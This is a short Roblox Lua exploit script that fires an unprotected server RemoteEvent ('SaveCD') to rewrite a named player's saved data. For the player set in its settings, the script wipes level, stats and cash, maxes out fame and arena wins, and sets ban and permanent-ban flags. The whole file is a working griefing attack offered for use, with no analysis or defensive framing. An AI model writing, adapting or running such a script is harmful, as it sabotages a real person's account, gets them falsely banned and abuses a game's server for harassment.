-- Settings
name = "CountlessProductions"

-- Variable
local player = game.Players.LocalPlayer

-- Change
function change(value, path)
    game.ReplicatedStorage.SaveCD:FireServer(value, path)
end

-- Skeet
for i,v in pairs(workspace:GetChildren()) do
    if v:IsA("Folder") and v:FindFirstChild("PlayerData") then
        change(1, v.PlayerData[name].Level)
        change(1, v.PlayerData[name].Strength)
        change(1, v.PlayerData[name].Durability)
        change(1, v.PlayerData[name].Agility)
        change(2^63-1, v.PlayerData[name].Fame)
        change(2^63-1, v.PlayerData[name].ArenaWins)
        change(0, v.PlayerData[name].Cash)
        change(true, v.PlayerData[name].Ban)
        change(true, v.PlayerData[name].PermBan)
    end
end